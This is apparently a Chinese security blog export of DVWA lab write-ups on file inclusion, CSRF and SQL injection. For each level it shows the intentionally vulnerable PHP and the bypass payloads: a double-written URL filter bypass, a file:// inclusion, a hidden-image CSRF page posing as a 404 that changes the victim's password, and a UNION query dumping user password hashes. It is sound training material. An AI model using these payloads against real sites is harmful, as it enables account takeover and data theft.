<p>   <strong>二.Medium级别</strong></p>
<p>   服务器端代码：</p>
   <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Inputvalidation</span></span><br><span class="line">$file=str_replace(<span class="keyword">array</span>(<span class="string">"http://"</span>,<span class="string">"https://"</span>),<span class="string">""</span>,$file);</span><br><span class="line">$file=str_replace(<span class="keyword">array</span>(<span class="string">"../"</span>,<span class="string">"..\""</span>),<span class="string">""</span>,$file);</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>   代码分析：</p>
<p>   增加了函数<strong>str_replace</strong>(),对page进行一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符</p>
<p>   漏洞利用 </p>
<p>   ①可以使用<strong>双写</strong>进行绕过：</p>
<p>   <code>page=hthttp://tp://127.0.0.1/phpinfo.txt</code>时，str_replace函数会将http://删除，</p>
<p>   于是<code>page=&lt;http://127.0.0.1/phpinfo.txt&gt;</code></p>
<p>​        ②因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制 </p>
<p><img src="/images/File_Inclusion/3.png" alt="3"></p>
<p><strong>三.High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Inputvalidation</span></span><br><span class="line"><span class="keyword">if</span>(!fnmatch(<span class="string">"file*"</span>,$file)&amp;&amp;$file!=<span class="string">"include.php"</span>)&#123;</span><br><span class="line">   <span class="comment">//Thisisn'tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"ERROR:Filenotfound!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 </p>
<p>漏洞利用：可以利用file协议绕过防护策略 </p>
<p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/page=file:///W:/wamp/www/DVWA-master/php.ini</code></p>
<p><img src="/images/File_Inclusion/4.png" alt="4"></p>
<p><strong>四.Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">"include.php"</span>&amp;&amp;$file!=<span class="string">"file1.php"</span>&amp;&amp;$file!=<span class="string">"file2.php"</span>&amp;&amp;$file!=<span class="string">"file3.php"</span>)&#123;</span><br><span class="line"><span class="comment">//Thisisn'tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"ERROR:Filenotfound!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p>Impossible级别的代码使用了白名单机制进行防护，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞 </p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-CSRF</title>
    <url>/2018/08/10/CSRF/</url>
    <content><![CDATA[<p><strong>CSRF</strong></p>
<p>跨站请求伪造指利用受害者尚未失效的身份认证信息（cookie，会话）等，诱骗其点击恶意链接或访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向服务器发送请求，从而完成非法操作</p>
<p>CSRF与XSS最大的区别在于，CSRF并没有盗取cookie而是直接利用。</p>
<a id="more"></a>

<p><strong>一.Low级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制 。</p>
<p>引导方法：</p>
<blockquote>
<p>发邮件.转短链接隐藏地址，但是会进入修改成功的提示页，用户会知道</p>
<p>构造攻击页面，插入图片<code>&lt;img src=&#39;改密url&#39;/&gt;</code>标签或（404页面），用户访问时，浏览器加载时修改密码</p>
</blockquote>
<p>漏洞利用：</p>
<p>1.构造页面：</p>
<p><code>127.0.0.1/DVWAmaster/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#</code></p>
<p>受害者点击该链接后密码会被修改，但前提是需使用同一浏览器</p>
<p>若url不是ip域名时，可以修改为短链接隐藏域名</p>
<p>2.构造页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改 </p>
<p><img src="/images/CSRF/1.png" alt="1"></p>
<p><strong>二.Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>函数介绍：</p>
<p><strong>int eregi(string pattern,string string)：</strong></p>
<p>检查string中是否含有pattern（不区分大小写）如果有返回True，否则返回False。</p>
<p>代码分析：</p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名 </p>
<p>漏洞利用：</p>
<p>过滤规则是http包头的Referer参数的值中必须包含主机名（127.0.0.1） </p>
<p>可以将攻击页面命名为127.0.0.1.html(页面放置在攻击者的服务器里)</p>
<p><strong>三.High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 </p>
<p> 漏洞利用：</p>
<p>1.可通过获取token来绕过反CSRF机制，利用被攻击者的cookie去修改密码的页面获取关键的token，可以去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，完成CSRF攻击</p>
<p>2.利用XSS漏洞和CSRF漏洞共同完成的：</p>
<p>​    通过XSS漏洞获取浏览器cookie </p>
<p>​    通过brupsuite进行拦截，获取数据包修改参数</p>
<p><img src="/images/CSRF/2.png" alt="2"></p>
<p><strong>四.Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ]; </span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input </span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// It does! </span></span><br><span class="line">        $pass_new = stripslashes( $pass_new ); </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析；</p>
<p>Impossible级别的代码使用Token验证，需要重新输入旧密码可以有效的抵御CSRF</p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-SQL Injection</title>
    <url>/2018/08/08/sql/</url>
    <content><![CDATA[<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><em>DVWA练习</em></h1><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p><strong>一.LOW级别</strong></p>
<a id="more"></a>
<p>服务器端代码:<br> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">	$result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br> 代码分析：</p>
<h5 id="id-GET-‘id’"><a href="#id-GET-‘id’" class="headerlink" title="$id = $_GET[‘id’];"></a><strong>$id = $_GET[‘id’];</strong></h5><p> 这里对传入的参数id未作任何过滤和防注入处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">$result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br></pre></td></tr></table></figure>

<p>getid和result都未对id做任何处理所以存在很明显的注入漏洞<br><img src="/images/sqli/1.png" alt="1"><br>使用相应的sql注入语句即可得到数据库的内容</p>
<p><strong>二.Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>$id=$_GET[‘id’]；</strong></p>
</blockquote>
<blockquote>
<p><strong>$id=mysql_real_escape_string($id); 这里对id进行了转义的操作</strong></p>
</blockquote>
<blockquote>
<p><strong>$getid=”SELECTfirst_name,last_nameFROMusersWHEREuser_id=$id”;</strong></p>
</blockquote>
<h4 id="mysql-real-escape-string函数对id参数进行了转义操作"><a href="#mysql-real-escape-string函数对id参数进行了转义操作" class="headerlink" title="mysql_real_escape_string函数对id参数进行了转义操作"></a>mysql_real_escape_string函数对id参数进行了转义操作</h4><p>具体的转义包括</p>
<ul>
<li>‘ =&gt; &#39;</li>
<li>“ =&gt; &quot;</li>
<li>\ =&gt; \</li>
<li>\n =&gt; \n</li>
</ul>
<h5 id="可以抓包对id参数的内容修改进行sql注入"><a href="#可以抓包对id参数的内容修改进行sql注入" class="headerlink" title="可以抓包对id参数的内容修改进行sql注入"></a>可以抓包对id参数的内容修改进行sql注入</h5><p><img src="/images/sqli/2.png" alt="2"></p>
<p>构造sql语句进行注入</p>
<p>抓包修改参数id为</p>
<p><code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
<p>得到数据</p>
<p><img src="/images/sqli/1.png" alt="1"></p>
<p><strong>三.High级别</strong></p>
<p>服务器端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了<strong>LIMIT 1，</strong>希望以此控制只输出<strong>一个结果</strong>。</p>
<p><strong>可以通过#将其注释掉</strong></p>
<p><code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
<p><img src="/images/sqli/1.png" alt="img"></p>
<p><strong>四.Impossible级别</strong></p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Get values </span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>Impossible级别的代码采用的POD技术，划清了代码与数据的界限，有效的防御了SQL注入</p>
<p>int型参数增加is_numeric判断，不接受其他字符串，避免了sql注入</p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Security</title>
    <url>/2018/05/22/%E5%88%9D%E6%B6%89Web%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="常见漏洞介绍"><a href="#常见漏洞介绍" class="headerlink" title="常见漏洞介绍"></a>常见漏洞介绍</h1><p>由于接触的时间比较短，所以就从从最基础的Web安全开始说起（只是应用漏洞中的一小块）</p>
<h4 id="输入验证测试"><a href="#输入验证测试" class="headerlink" title="输入验证测试"></a><strong>输入验证测试</strong></h4><ol>
<li>SQLI</li>
<li>XSS</li>
<li>文件包含</li>
<li>文件读取</li>
</ol>
<p>以及中间件安全中的解析漏洞</p>
<a id="more"></a>
<h4 id="先说sql注入漏洞"><a href="#先说sql注入漏洞" class="headerlink" title="先说sql注入漏洞"></a><strong>先说sql注入漏洞</strong></h4><p> <strong><em>SQL</em></strong>:结构化查询语言，是一种特殊目的的结构化查询语言，可以用来操作数据库。而数据库又分为<br>   关系型数据库 ：关系数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。即邮二维表及其之间的联系组成的数据组织</p>
<ul>
<li>mysql</li>
<li>MS SQL Server</li>
<li>Postgresql</li>
<li>Oracle</li>
</ul>
<p>非关系型数据库：即分布式，不稳定，利用键值对储存的一种数据库（NoSQL）</p>
<ul>
<li>MongoDB</li>
<li>CouchDB</li>
